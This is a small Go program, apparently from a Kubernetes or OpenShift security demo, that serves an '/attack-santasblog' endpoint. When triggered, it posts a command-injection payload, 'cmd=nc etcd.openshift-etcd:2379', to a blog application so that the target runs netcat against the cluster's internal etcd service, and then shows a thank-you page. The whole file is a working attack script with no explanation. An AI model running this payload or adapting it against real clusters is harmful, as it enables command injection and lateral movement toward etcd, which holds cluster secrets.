package main

import (
	"bytes"
	"fmt"
	"log"
	"net/http"
)

func main() {
	http.HandleFunc("/attack-santasblog", sendPostRequestHandler)
	port := ":8080" // Replace with your desired port
	fmt.Printf("Server is running on port %s\n", port)
	err := http.ListenAndServe(port, nil)
	if err != nil {
		log.Fatal(err)
	}
}

func sendPostRequestHandler(w http.ResponseWriter, r *http.Request) {
	url := "http://santablog-northpole.apps.ocp.ralvares.com/posts"
	data := []byte("cmd=nc etcd.openshift-etcd:2379")

	resp, err := http.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer(data))
	if err != nil {
		fmt.Println("HTTP POST request error:", err)
		http.Error(w, "HTTP POST request error", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("HTTP POST request failed with status code: %d\n", resp.StatusCode)
		http.Error(w, fmt.Sprintf("HTTP POST request failed with status code: %d", resp.StatusCode), http.StatusInternalServerError)
		return
	}

	if err != nil {
		fmt.Println("Error reading response body:", err)
		http.Error(w, "Error reading response body", http.StatusInternalServerError)
		return
	}

	fmt.Fprintf(w, "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'><style>body{background-color:#FFFFFF;color:#32CD32;font-family:'Ubuntu',sans-serif;text-align:center;padding:20px;}h1{font-size:36px;margin:0;text-transform:uppercase;}</style></head><body><h1>Thanks for helping me today!</h1></body></html>")
}

